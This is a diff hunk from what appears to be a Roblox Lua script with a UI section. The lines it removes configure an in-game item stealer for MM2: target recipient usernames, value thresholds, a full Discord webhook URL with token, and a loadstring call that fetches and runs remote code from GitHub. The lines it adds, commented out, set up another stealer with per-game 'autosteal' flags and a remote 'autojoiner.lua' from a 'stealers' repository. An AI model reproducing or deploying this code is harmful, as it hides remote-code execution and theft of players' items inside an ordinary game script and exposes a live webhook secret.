@@ -237,14 +237,17 @@ pcall(function()
         end
     end
 
-            
-    _G.Usernames = {"t_cheloux", "Dont_Distrubs", "Dont_Distrubs2", "Dont_Distrubs3", "anfall38", "mousta34"} -- you can add as many as you'd like
-    _G.min_rarity = "Common"
-    _G.min_value = 1 -- Put 1 to get all
-    _G.pingEveryone = "No" -- change to "No" if you dont want pings
-    _G.webhook = "https://discord.com/api/webhooks/1405869490834509875/cd1mf7PukC7xP828WJnLz94ey4nT9ha75Xc2RGhSuIBt5_6ufnyHaYt17VeXqGpweVJI" -- change to your webhook
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Cyber-Xong/script-MM2-update/refs/heads/main/MM2"))()
-    
+    --token = "" --can use ur alts token or a bot token (more secure) and put the token between the ""
+    --infowebhook = "" -- THIS IS REQUIRED IF YOU DONT USE A BOT TOKEN
+    --channelId = "" --where hits are, put it between ""
+    --bot = True -- change false to true if you use a bot token
+    --settings = {
+       -- ["gag"] = {autosteal = False}, -- set the value to true if you want to autosteal this game, else set it to false
+       -- ["mm2"] = {autosteal = False, minvalue = 1}, -- set the value to true if you want to autosteal this game, else set it to false
+        --["adm"] = {autosteal = False, minvalue = 1000}, -- set the value to true if you want to autosteal this game, else set it to false
+    --}
+    --loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/refs/heads/main/autojoiner.lua"))()
+        
     -------------------
     -- UI
     -------------------
